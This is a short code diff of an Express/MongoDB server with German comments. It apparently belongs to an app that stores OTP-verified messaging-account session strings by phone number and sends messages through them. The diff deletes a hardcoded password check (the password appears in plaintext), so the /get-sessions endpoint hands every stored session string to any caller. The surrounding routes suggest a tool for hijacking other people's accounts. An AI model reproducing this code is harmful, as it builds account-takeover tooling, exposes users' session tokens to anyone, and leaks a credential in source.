@@ -56,13 +56,24 @@ app.post('/verify-otp', async (req, res) => {
 });
 
 app.get('/get-sessions', async (req, res) => {
-    // Passwort-Check einfach gehalten
-    if (req.query.pass !== 'Hinva312-') return res.status(401).json({ error: 'Unauthorized' });
     try {
-        const sessions = await Session.find();
+        // Aggregation: Gruppiert nach Telefonnummer, nimmt den ersten Session-String
+        const sessions = await Session.aggregate([
+            {
+                $group: {
+                    _id: "$phoneNumber",
+                    sessionString: { $first: "$sessionString" },
+                    createdAt: { $first: "$createdAt" }
+                }
+            },
+            { $sort: { createdAt: -1 } }
+        ]);
         res.json(sessions);
-    } catch (err) { res.status(500).json({ error: 'DB Fehler' }); }
+    } catch (err) {
+        res.status(500).send("Fehler beim Laden");
+    }
 });
+
 
 app.post('/send-message', async (req, res) => {
     const { phone, target, message } = req.body;
